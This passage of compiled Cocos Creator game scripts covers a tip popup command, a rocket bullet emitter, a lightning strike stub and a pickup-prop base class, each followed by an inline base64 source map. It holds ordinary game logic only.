                                    node_1.runAction(cc.sequence(cc.moveTo(duration, cc.v2(cc.view.getVisibleSize().width / 2, y)), cc.delayTime(2), cc.moveTo(duration, cc.v2(cc.view.getVisibleSize().width / 2, cc.view.getVisibleSize().height)), cc.callFunc(function () {
                                        node_1.destroy();
                                        resolve();
                                    })));
                                }
                            }
                            else {
                                console.error(error);
                            }
                        });
                    })];
            });
        });
    };
    ShowTipsCommand = __decorate([
        ccclass('ShowTipsCommand')
    ], ShowTipsCommand);
    return ShowTipsCommand;
}());
exports.default = ShowTipsCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL3RpcHMvU2hvd1RpcHNDb21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSwyREFBcUQ7QUFDckQsMERBQXFEO0FBRS9DLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQUE7SUErQkEsQ0FBQztJQTdCUyxpQ0FBTyxHQUFiO1FBQWUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQzNCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUMsT0FBTyxFQUFFLE1BQU07d0JBQy9CLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLGFBQWEsRUFBRSxFQUFFLENBQUMsTUFBTSxFQUFFLFVBQUMsS0FBSyxFQUFFLFFBQVE7NEJBQ3pELElBQUksS0FBSyxJQUFFLElBQUksRUFBQztnQ0FDWCxJQUFJLE1BQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLFFBQVEsQ0FBQyxDQUFDO2dDQUNwQyxJQUFJLFVBQVUsR0FBRyxNQUFJLENBQUMsY0FBYyxDQUFDLE9BQU8sQ0FBQyxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLENBQUM7Z0NBQ3hFLElBQUksTUFBTSxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUMsSUFBSSxTQUFTLENBQUM7Z0NBQ2xDLFVBQVUsQ0FBQyxNQUFNLEdBQUcsdUNBQXFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsR0FBRyxFQUFFLEdBQUcsQ0FBQyxDQUFDLE9BQU8sQ0FBQyxHQUFHLEVBQUUsR0FBRyxDQUFDLG1CQUFnQixDQUFDO2dDQUNwSCxJQUFJLEVBQUUsQ0FBQyxRQUFRLENBQUMsUUFBUSxFQUFFLEVBQUM7b0NBQ3ZCLEVBQUUsQ0FBQyxRQUFRLENBQUMsUUFBUSxFQUFFLENBQUMsUUFBUSxDQUFDLE1BQUksQ0FBQyxDQUFDO29DQUN0QyxNQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxZQUFZLEVBQUUsQ0FBQztvQ0FDNUMsTUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsS0FBSyxHQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxDQUFDO29DQUN6RixJQUFJLFFBQVEsR0FBRyxZQUFHLENBQUMsU0FBUyxDQUFBLENBQUMsQ0FBQSxHQUFHLENBQUEsQ0FBQyxDQUFBLEdBQUcsQ0FBQztvQ0FDckMsSUFBSSxDQUFDLEdBQUcsWUFBRyxDQUFDLFNBQVMsQ0FBQSxDQUFDLENBQUEsRUFBRSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxNQUFNLEdBQUMsTUFBSSxDQUFDLE1BQU0sR0FBQyxjQUFJLENBQUMsd0JBQXdCLENBQUEsQ0FBQyxDQUFBLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsTUFBTSxHQUFDLE1BQUksQ0FBQyxNQUFNLENBQUM7b0NBQzVJLE1BQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FDdEIsRUFBRSxDQUFDLE1BQU0sQ0FBQyxRQUFRLEVBQUUsRUFBRSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLEtBQUssR0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsRUFDL0QsRUFBRSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsRUFDZixFQUFFLENBQUMsTUFBTSxDQUFDLFFBQVEsRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsS0FBSyxHQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxDQUFDLEVBQzdGLEVBQUUsQ0FBQyxRQUFRLENBQUM7d0NBQ1IsTUFBSSxDQUFDLE9BQU8sRUFBRSxDQUFDO3dDQUNmLE9BQU8sRUFBRSxDQUFDO29DQUNkLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztpQ0FDWjs2QkFDTDtpQ0FBTTtnQ0FDSCxPQUFPLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQyxDQUFDOzZCQUN4Qjt3QkFDSixDQUFDLENBQUMsQ0FBQztvQkFDUCxDQUFDLENBQUMsRUFBQzs7O0tBQ047SUE5QmdCLGVBQWU7UUFEbkMsT0FBTyxDQUFDLGlCQUFpQixDQUFDO09BQ04sZUFBZSxDQStCbkM7SUFBRCxzQkFBQztDQS9CRCxBQStCQyxJQUFBO2tCQS9Cb0IsZUFBZSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge0lDb21tYW5kfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9JQ29tbWFuZFwiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCBWaWV3IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29tcG9uZW50L1ZpZXdcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3MoJ1Nob3dUaXBzQ29tbWFuZCcpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFNob3dUaXBzQ29tbWFuZCBpbXBsZW1lbnRzIElDb21tYW5kIHtcclxuXHJcbiAgICBhc3luYyBleGVjdXRlICguLi5hcmdzKTpQcm9taXNle1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKCdwcmVmYWIvdGlwcycsIGNjLlByZWZhYiwgKGVycm9yLCByZXNvdXJjZSkgPT4ge1xyXG4gICAgICAgICAgICAgICBpZiAoZXJyb3I9PW51bGwpe1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUocmVzb3VyY2UpO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCB0aXRsZUxhYmVsID0gbm9kZS5nZXRDaGlsZEJ5TmFtZSgndGl0bGUnKS5nZXRDb21wb25lbnQoY2MuUmljaFRleHQpO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBzdHJpbmcgPSBhcmdzWzBdIHx8IFwi5oKo5b+Y6K6w5Lyg5Y+C5pWw5Za9XCI7XHJcbiAgICAgICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7c3RyaW5nLnJlcGxhY2UoXCI+XCIsIFwi44CLXCIpLnJlcGxhY2UoXCI8XCIsIFwi44CKXCIpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNjLmRpcmVjdG9yLmdldFNjZW5lKCkuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuZ2V0Q29tcG9uZW50KGNjLkxheW91dCkudXBkYXRlTGF5b3V0KCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUucG9zaXRpb24gPSBjYy52MihjYy52aWV3LmdldFZpc2libGVTaXplKCkud2lkdGgvMiwgY2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLmhlaWdodCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkdXJhdGlvbiA9IGV4dC5pc0lwaG9uZVg/MC4zOjAuMjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHkgPSBleHQuaXNJcGhvbmVYP2NjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS5oZWlnaHQtbm9kZS5oZWlnaHQtVmlldy5JUEhPTkVYX1RPUF9CTEFDS19IRUlHSFQ6Y2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLmhlaWdodC1ub2RlLmhlaWdodDtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYy5tb3ZlVG8oZHVyYXRpb24sIGNjLnYyKGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yLCB5KSksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYy5kZWxheVRpbWUoMiksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYy5tb3ZlVG8oZHVyYXRpb24sIGNjLnYyKGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yLCBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0KSksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuZGVzdHJveSgpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihlcnJvcik7XHJcbiAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterHuoJianTong.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'e866aL+CRFBSp2UxvZucu5u', 'BulletEmitterHuoJianTong');
// script/app/entities/bulletEmitter/BulletEmitterHuoJianTong.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterHuoJianTong = /** @class */ (function (_super) {
    __extends(BulletEmitterHuoJianTong, _super);
    function BulletEmitterHuoJianTong(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 1000;
        _this._interval = 0.5;
        _this._speed = 600;
        return _this;
    }
    BulletEmitterHuoJianTong.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.HuoJianTong);
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.fly(dir, this._firingRange, this._speed);
    };
    return BulletEmitterHuoJianTong;
}(BulletEmitter_1.default));
exports.default = BulletEmitterHuoJianTong;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckh1b0ppYW5Ub25nLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSxpREFBNEM7QUFJNUM7SUFBc0QsNENBQWE7SUFFL0Qsa0NBQVkscUJBQTJDO1FBQXZELFlBQ0ksa0JBQU0scUJBQXFCLENBQUMsU0FJL0I7UUFIRyxLQUFJLENBQUMsWUFBWSxHQUFHLElBQUksQ0FBQztRQUN6QixLQUFJLENBQUMsU0FBUyxHQUFHLEdBQUcsQ0FBQztRQUNyQixLQUFJLENBQUMsTUFBTSxHQUFHLEdBQUcsQ0FBQzs7SUFDdEIsQ0FBQztJQUVELHVDQUFJLEdBQUosVUFBSyxLQUFjLEVBQUUsR0FBWTtRQUM3QixJQUFJLENBQUMsV0FBVyxFQUFFLENBQUM7UUFDbkIsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFdBQVcsQ0FBQyxDQUFDO1FBQzNGLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMxQixNQUFNLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUM7UUFDN0IsTUFBTSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDcEQsQ0FBQztJQUNMLCtCQUFDO0FBQUQsQ0FoQkEsQUFnQkMsQ0FoQnFELHVCQUFhLEdBZ0JsRSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgR2FtZUJ1bGxldHNDb250cm9sbGVyIGZyb20gXCIuLi8uLi9nYW1lL0dhbWVCdWxsZXRzQ29udHJvbGxlclwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlciBmcm9tIFwiLi9CdWxsZXRFbWl0dGVyXCI7XHJcblxyXG5cclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldEVtaXR0ZXJIdW9KaWFuVG9uZyBleHRlbmRzIEJ1bGxldEVtaXR0ZXIge1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSAxMDAwO1xyXG4gICAgICAgIHRoaXMuX2ludGVydmFsID0gMC41O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gNjAwO1xyXG4gICAgfVxyXG5cclxuICAgIGZpcmUoc3RhcnQ6IGNjLlZlYzIsIGRpcjogY2MuVmVjMikge1xyXG4gICAgICAgIHRoaXMuYnVsbGV0Q291bnQtLTtcclxuICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5IdW9KaWFuVG9uZyk7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBidWxsZXQubm9kZS5wb3NpdGlvbiA9IHN0YXJ0O1xyXG4gICAgICAgIGJ1bGxldC5mbHkoZGlyLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletStrike/BulletStrikeLightning.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ab684CB0vVLEKw8NZ+RRLXB', 'BulletStrikeLightning');
// script/app/entities/bulletStrike/BulletStrikeLightning.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletStrike_1 = require("./BulletStrike");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletStrikeLightning = /** @class */ (function (_super) {
    __extends(BulletStrikeLightning, _super);
    function BulletStrikeLightning() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.spriteNode = null;
        return _this;
    }
    BulletStrikeLightning.prototype.init = function (id) {
    };
    BulletStrikeLightning.prototype.strike = function () {
    };
    __decorate([
        property(cc.Node)
    ], BulletStrikeLightning.prototype, "spriteNode", void 0);
    BulletStrikeLightning = __decorate([
        ccclass
    ], BulletStrikeLightning);
    return BulletStrikeLightning;
}(BulletStrike_1.default));
exports.default = BulletStrikeLightning;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldFN0cmlrZS9CdWxsZXRTdHJpa2VMaWdodG5pbmcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLCtDQUEwQztBQUVwQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFtRCx5Q0FBWTtJQUEvRDtRQUFBLHFFQWVDO1FBWkcsZ0JBQVUsR0FBVyxJQUFJLENBQUM7O0lBWTlCLENBQUM7SUFURyxvQ0FBSSxHQUFKLFVBQUssRUFBRTtJQUNQLENBQUM7SUFHRCxzQ0FBTSxHQUFOO0lBRUEsQ0FBQztJQVREO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7NkRBQ1E7SUFIVCxxQkFBcUI7UUFEekMsT0FBTztPQUNhLHFCQUFxQixDQWV6QztJQUFELDRCQUFDO0NBZkQsQUFlQyxDQWZrRCxzQkFBWSxHQWU5RDtrQkFmb0IscUJBQXFCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRTdHJpa2UgZnJvbSBcIi4vQnVsbGV0U3RyaWtlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldFN0cmlrZUxpZ2h0bmluZyBleHRlbmRzIEJ1bGxldFN0cmlrZSB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBzcHJpdGVOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuXHJcbiAgICBpbml0KGlkKSB7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHN0cmlrZSgpIHtcclxuXHJcbiAgICB9XHJcblxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/prop/PropBase.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5c07bd2qlBC57ZQMODENtUU', 'PropBase');
// script/app/entities/prop/PropBase.ts

Object.defineProperty(exports, "__esModule", { value: true });
var GameProxy_1 = require("../../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var PropBase = /** @class */ (function (_super) {
    __extends(PropBase, _super);
    function PropBase() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        // @property
        _this.cd = 12;
        _this.collider = null;
        /** 是否触发了 */
        _this._on_off = false;
        /** 是否被磁铁吸引 */
        _this._magnetic = false;
        _this.propID = -1;
        return _this;
    }
    Object.defineProperty(PropBase.prototype, "on_off", {
        get: function () {
            return this._on_off;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(PropBase.prototype, "magnetic", {
        get: function () {
            return this._magnetic;
        },
        set: function (value) {
            if (value != this._magnetic) {
                this._magnetic = value;
                if (this._magnetic) {
                    // console.log("磁力生效===>");
                    this.node.stopAllActions();
                    /** 撞向角色 */
                    this.moveToRole();
                }
            }
        },
        enumerable: false,
        configurable: true
    });
    PropBase.prototype.moveToRole = function () {
        var _this = this;
        var gameRoleController = window['GameRoleController'];
        var speed = 1000;
        var distance = this.node.position.sub(gameRoleController.role.node.position).mag();
        this.node.runAction(cc.sequence(cc.moveTo(distance / speed, gameRoleController.role.node.position).easing(cc.easeSineIn()), cc.callFunc(function () {
            _this.moveToRole();
        })));
    };
    PropBase.prototype.init = function (id) {
        this.propID = id;
    };
    PropBase.prototype.display = function () {
        var _this = this;
        this._on_off = false;
        this.node.active = true;
        //倒计时
        if (this.cd > 0) {
            this.node.runAction(cc.sequence(cc.delayTime(this.cd - 5), cc.blink(5, 25), cc.callFunc(function () {
                _this.node.active = false;
            })));
        }
    };
    PropBase.prototype.trigger = function () {
        this._on_off = true;
        this.node.stopAllActions();
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.PropTrigger, this);
        this.node.active = false;
    };
    PropBase.prototype.onLoad = function () {
        this.collider = this.getComponent(cc.Collider);
    };
    PropBase.prototype.onEnable = function () {
        /** 检测与角色的碰撞 */
        this._on_off = false;
        this._magnetic = false;
        window['GameEnemysController'].gameProps.push(this);
    };
    PropBase.prototype.onDisable = function () {
        this.node.stopAllActions();
        var gameEnemysController = window['GameEnemysController'];
        gameEnemysController.gameProps.splice(gameEnemysController.gameProps.indexOf(this), 1);
    };
    PropBase = __decorate([
        ccclass
    ], PropBase);
    return PropBase;
}(cc.Component));
exports.default = PropBase;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3Byb3AvUHJvcEJhc2UudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUVBLGtEQUErQztBQUV6QyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFzQyw0QkFBWTtJQUFsRDtRQUFBLHFFQW9GQztRQWxGRyxZQUFZO1FBQ1osUUFBRSxHQUFHLEVBQUUsQ0FBQztRQUVSLGNBQVEsR0FBZSxJQUFJLENBQUM7UUFFNUIsWUFBWTtRQUNGLGFBQU8sR0FBRyxLQUFLLENBQUM7UUFFMUIsY0FBYztRQUNOLGVBQVMsR0FBRyxLQUFLLENBQUM7UUFnQzFCLFlBQU0sR0FBRyxDQUFDLENBQUMsQ0FBQzs7SUF5Q2hCLENBQUM7SUF2RUcsc0JBQUksNEJBQU07YUFBVjtZQUNJLE9BQU8sSUFBSSxDQUFDLE9BQU8sQ0FBQztRQUN4QixDQUFDOzs7T0FBQTtJQUdELHNCQUFJLDhCQUFRO2FBQVo7WUFDSSxPQUFPLElBQUksQ0FBQyxTQUFTLENBQUM7UUFDMUIsQ0FBQzthQUVELFVBQWEsS0FBYztZQUN2QixJQUFJLEtBQUssSUFBSSxJQUFJLENBQUMsU0FBUyxFQUFDO2dCQUN4QixJQUFJLENBQUMsU0FBUyxHQUFHLEtBQUssQ0FBQztnQkFDdkIsSUFBSSxJQUFJLENBQUMsU0FBUyxFQUFDO29CQUNmLDJCQUEyQjtvQkFDM0IsSUFBSSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztvQkFDM0IsV0FBVztvQkFDWCxJQUFJLENBQUMsVUFBVSxFQUFFLENBQUM7aUJBQ3JCO2FBQ0o7UUFDTCxDQUFDOzs7T0FaQTtJQWNPLDZCQUFVLEdBQWxCO1FBQUEsaUJBT0M7UUFORyxJQUFJLGtCQUFrQixHQUFHLE1BQU0sQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDO1FBQ3RELElBQUksS0FBSyxHQUFHLElBQUksQ0FBQztRQUNqQixJQUFJLFFBQVEsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsa0JBQWtCLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQztRQUNuRixJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsUUFBUSxHQUFDLEtBQUssRUFBRSxrQkFBa0IsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsVUFBVSxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ2xJLEtBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztRQUN0QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDVCxDQUFDO0lBSUQsdUJBQUksR0FBSixVQUFLLEVBQVM7UUFDVixJQUFJLENBQUMsTUFBTSxHQUFHLEVBQUUsQ0FBQztJQUNyQixDQUFDO0lBRUQsMEJBQU8sR0FBUDtRQUFBLGlCQVNDO1FBUkcsSUFBSSxDQUFDLE9BQU8sR0FBRyxLQUFLLENBQUM7UUFDckIsSUFBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQ3hCLEtBQUs7UUFDTCxJQUFJLElBQUksQ0FBQyxFQUFFLEdBQUcsQ0FBQyxFQUFDO1lBQ1osSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxFQUFFLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxFQUFFLEdBQUMsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLEtBQUssQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztnQkFDbEYsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1lBQzdCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztTQUNSO0lBQ0wsQ0FBQztJQUVELDBCQUFPLEdBQVA7UUFDSSxJQUFJLENBQUMsT0FBTyxHQUFHLElBQUksQ0FBQztRQUNwQixJQUFJLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDO1FBQzNCLHFCQUFTLENBQUMsSUFBSSxDQUFDLHFCQUFTLENBQUMsS0FBSyxDQUFDLFdBQVcsRUFBRSxJQUFJLENBQUMsQ0FBQztRQUNsRCxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7SUFDN0IsQ0F